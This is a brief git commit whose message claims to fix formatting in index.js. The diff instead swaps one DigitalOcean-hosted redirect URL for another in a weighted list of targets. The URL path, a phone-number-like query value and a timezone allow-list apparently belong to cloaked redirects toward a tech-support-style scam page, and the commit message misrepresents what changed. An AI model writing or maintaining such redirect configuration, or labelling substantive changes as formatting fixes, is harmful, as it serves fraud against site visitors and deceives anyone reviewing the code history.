5776fa7aa8b8668c04dfe7e7490e5afab9ad0ef9
paalakash <palaksh452@gmail.com>
2026-07-17 05:46:39 +0530

    Fix formatting issues in index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seahorse-app-jfos5.ondigitalocean.app/werrx01USAHTML/?bcda=1800-849-046", weight: 1.0 }
+    { url: "https://hammerhead-app-ng38w.ondigitalocean.app/werrx01USAHTML/?bcda=1800-849-046", weight: 1.0 }
     
 ];
 
